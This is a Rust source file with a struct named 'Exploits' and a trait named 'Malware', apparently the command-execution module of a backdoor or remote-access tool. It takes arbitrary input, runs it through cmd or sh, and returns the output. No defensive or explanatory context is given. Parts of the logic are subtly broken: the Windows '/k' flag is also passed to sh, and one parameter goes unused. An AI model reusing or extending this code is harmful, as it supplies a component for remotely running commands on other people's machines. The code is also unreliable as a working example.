use std::ffi::OsString;
use std::process::Command;

#[derive(Debug)]
pub struct Exploits {
    pub exploit_input: Vec<u8>,
    exploit_output: Vec<u8>,
    shell: Command,
}

impl Exploits {
    pub fn default() -> Exploits {
        Exploits {
            exploit_input: vec![],
            exploit_output: vec![],
            shell: Exploits::shell(),
        }
    }

    pub fn shell() -> Command {
        if cfg!(target_os = "windows") {
            Command::new("cmd")
        } else {
            Command::new("sh")
        }
    }
}

pub trait Malware {
    fn execute(&mut self) -> Vec<u8>;
    fn get_output(&mut self) -> Vec<u8>;
    fn command(&mut self, command: Vec<u8>, last_cmd: OsString) -> Exploits;
}

impl Malware for Exploits {
    fn execute(&mut self) -> Vec<u8> {
        let exploit_input =
            String::from_utf8(self.exploit_input.clone()).unwrap_or_else(|_| "".to_string());

        let output = if self.shell.get_args().any(|arg| arg == OsString::from("/k")) {
            self.shell
                .args([&exploit_input])
                .output()
                .expect("failed to execute process")
        } else {
            self.shell
                .args(["/k", &exploit_input])
                .output()
                .expect("failed to execute process")
        };

        if !output.stderr.is_empty() {
            output.stderr
        } else {
            output.stdout
        }
    }

    fn get_output(&mut self) -> Vec<u8> {
        self.exploit_output.clone()
    }

    fn command(&mut self, exploit_input: Vec<u8>, last_cmd: OsString) -> Exploits {
        Exploits {
            exploit_input,
            exploit_output: vec![],
            shell: Exploits::shell(),
        }
    }
}
